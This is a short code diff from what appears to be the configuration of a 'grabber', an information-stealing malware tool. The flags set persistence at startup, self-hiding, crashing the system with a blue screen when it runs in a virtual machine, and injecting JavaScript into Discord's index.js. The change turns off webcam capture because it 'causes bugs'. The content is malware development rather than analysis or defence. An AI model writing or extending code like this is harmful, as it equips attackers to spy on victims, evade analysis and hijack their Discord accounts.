@@ -37,7 +37,7 @@ BSOD = _config.get('BSOD', False) # Tries to trigger blue screen if system is VM
 STARTUP = _config.get('STARTUP', True) # Puts the grabber in startup
 HIDE_ITSELF = _config.get('HIDE_ITSELF', True) # Hides the grabber
 MESSAGE_BOX = _config.get('MSGBOX', dict()) # Message box
-CAPTURE_WEBCAM = True # Takes photo from the webcam
+CAPTURE_WEBCAM = False # Takes photo from the webcam (causes bugs, use at own risk)
 INJECT_JS = True # Modify discord's index.js
 
 class system:
